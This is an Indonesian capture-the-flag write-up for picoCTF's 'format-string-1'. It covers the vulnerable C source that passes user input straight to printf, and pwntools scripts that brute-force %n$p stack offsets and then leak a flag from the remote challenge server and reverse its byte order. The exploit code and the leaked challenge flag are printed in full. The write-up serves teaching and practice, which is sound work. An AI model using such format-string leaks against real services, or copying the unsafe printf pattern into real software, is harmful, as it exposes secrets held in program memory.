# format-string-1

# overview
challenge format string, sesuai namanya kita akan diberi program dengan kerentanan format string yang membuat kita bisa membaca stack. namun tantangan utama dari challenge ini
adalah bagaimana cara mengekstrak flag secara otomatis dan merubah nya dari bentuk little endian ke big endian. 

# tools
- pwntools python libc (sangat disarankan)

# recon
tentu langkah pertama adalah membaca metadatanya, dari sini sepertinya program ini normal. file elf 64 bit.
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> file format-string-1
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=62bc37ea6fa41f79dc756cc63ece93d8c5499e89, for GNU/Linux 3.2.0, not stripped
```
lalu aku coba jalankan programnya , tapi sepertinya program ini agak ribet 
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> ./format-string-1
'secret-menu-item-1.txt' file not found, aborting.
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> touch secret-menu-item-1.txt
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> ./format-string-1
'flag.txt' file not found, aborting.
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> touch flag.txt
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> ./format-string-1
'secret-menu-item-2.txt' file not found, aborting.
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> touch secret-menu-item-2.txt
```
program ini minta 3 file , yaitu **secret-menu-item-1.txt** , **flag.txt** , dan **secret-menu-item-2.txt**  
note : jangan lupa isi file flag.txt dengan flag bebas agar saat berhasil melakukan exploit, program melakukan print flag bukan file kosong.

untungnya setelah membuat 3 file itu program bisa berjalan dengan normal.
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> ./format-string-1
Give me your order and I'll read it back to you:
shinobu
Here's your order: shinobu
Bye!
```
disini program hanya menanyakan pesanan dan melakukan print pesanan kita sendiri. mari coba baca source code yang diberikan.
```C
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
oke, program sederhana lagi. jika kita mencari kerentanan program disini ada 1 yaitu di bagian saat program menulis ulang pesanan kita :
```C
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf); <---disini kerentanannya
```
nah printf() itu jelas bermasalah dan dapat menimbulkan kerentanan format string. mari coba cek di programnya
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> ./format-string-1
Give me your order and I'll read it back to you:
%p
Here's your order: 0x7fffe4a2b090
Bye!
```
Bom kerentanan format string jelas sekali ada di depan kita. namun kenapa ini bisa terjadi ? kenapa input **%p** bisa outputnya **0x7fffe4a2b090**. 

# how it works
jadi kerentanan format string termasuk kerentanan fatal yang bisa membuat kita me 'leak' atau membocorkan isi di stack dari program tersebut. nah karena flag sudah di open
dari awal program berjalan maka harusnya string flag sudah tertata rapi di stack, namun aku belum tahu di index ke berapa flag muncul, jadi kita harus cari tahu indexnya dulu.
hasil output dari %p adalah index 0, jika aku input %p.%p , persen p dua kali maka program akan ngeprint stack index 0 dan 1. karena input kita dibatasi hingga 1024 byte / 1024 karakter
kita punya akses penuh ke stack. 



# exploit
dari pada spam %p tiap program dijalankan , lebih baik menggunakan skrip python sederhana ini untuk mempermudah pencarian indexnya.  
note : isi flag lokal dengan karakter AAAAAAAA agar lebih mudah menemukan dimana index flag.
```Python
from pwn import *
context.log_level = 'error'

for i in range(32):
    payload = f'%{i}$p'
    io = process('./format-string-1')
    io.sendline(payload)
    io.recvuntil(b'order: ')
    value = io.recvline().strip().decode()
    
    print(f'index : {i} value : {value}')
    io.close()
```
result :
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> python3 exploit.py
/home/rotalactf/reno/pwn/format-string1/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(payload)
index : 0 value : %0$p
index : 1 value : 0x7ffee89dccb0
index : 2 value : (nil)
index : 3 value : (nil)
index : 4 value : 0xa
index : 5 value : 0x400
index : 6 value : 0x9
index : 7 value : (nil)
index : 8 value : (nil)
index : 9 value : 0x7c6b25a18ab0
index : 10 value : 0x7fff3de00ec7
index : 11 value : 0x71a06029e9d7
index : 12 value : 0x4
index : 13 value : (nil)
index : 14 value : 0x4141414141414141 
index : 15 value : 0x4141414141414141
index : 16 value : 0xa4141414141
index : 17 value : 0x7dcf00000000
index : 18 value : 0x7657a3e82ab0
index : 19 value : 0x7ffe685adf38
index : 20 value : 0x7ffd972679f0
index : 21 value : 0xffffffff
index : 22 value : 0x74d71f2ef860
index : 23 value : 0x7d86e7a9cab0
index : 24 value : (nil)
index : 25 value : (nil)
index : 26 value : (nil)
index : 27 value : 0x7a14e98062e0
index : 28 value : 0x1a0c23d
index : 29 value : 0x7d2175922d78
index : 30 value : 0x7024303325
index : 31 value : 0x7067040adab0
```
NOTE bahwa nilai hex dari karakter AAAAA yang ku buat di flag itu bernilai **41** maka jika ada semacam pola 41414141 (AAAA) di dalam stack itu adalah flag.
```
index : 14 value : 0x4141414141414141 
```
ternyata flag kita start dari index ke 14 di stack. artinya jika kita convert ke format string : **%14$p** saatnya merakit kode ke dua untuk mengekstrak flag dari stack,
pada bagian ini aku langsung menargetkan server dan membuat otomasi ekstrasi flag.
```Python
from pwn import *
context.log_level = 'error'

SERVER = 'mimas.picoctf.net'
PORT = 51521

def index_leak():
    for i in range(32):
        payload = f'%{i}$p'
        io = process('./format-string-1')
        io.sendline(payload)
        io.recvuntil(b'order: ')
        value = io.recvline().strip().decode()
        
        print(f'index : {i} value : {value}')
        io.close()

filtered = b''
for i in range(5):
    payload = f'%{14+i}$p' # membaca index 14 hingga index 16
    
    # io = process('./format-string-1')
    io = remote(SERVER,PORT)
    io.sendline(payload)
    io.recvuntil(b'order: ')
    
    leak = bytes.fromhex(io.recvline().strip().decode().replace('0x',''))
    filtered += leak[::-1]
    print(filtered.decode())
    io.close()
print(f'FLAG BERHASIL DI EKSTRAK : {filtered.decode()}')


```
Result
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string1)
└> python3 exploit.py
/home/rotalactf/reno/pwn/format-string1/exploit.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(payload)
picoCTF{
picoCTF{4n1m41_5
picoCTF{4n1m41_57y13_4x4
picoCTF{4n1m41_57y13_4x4_f14g_50
picoCTF{4n1m41_57y13_4x4_f14g_50396c64}
FLAG BERHASIL DI EKSTRAK : picoCTF{REDACTED}
```
done ni 
flag : **picoCTF{....................}**
# conclusion
intinya progam ini memiliki kerentanan format string yang membuat kita bisa membaca stack sesuka hati. namun dengan keterbatasan buffer. dan selain itu ada banyak tantangan untuk
bisa membaca plain teks / string asli dari stack karena semua data yang disimpan di stack adalah data dalam bentuk little endian.yang cukup merepotkan untuk membaliknya menjadi 
big endian dulu baru bisa di decode. namun jika sudah memiliki pemahaman mengenai mereka maka mendecode hasil leak bukan masalah besar.
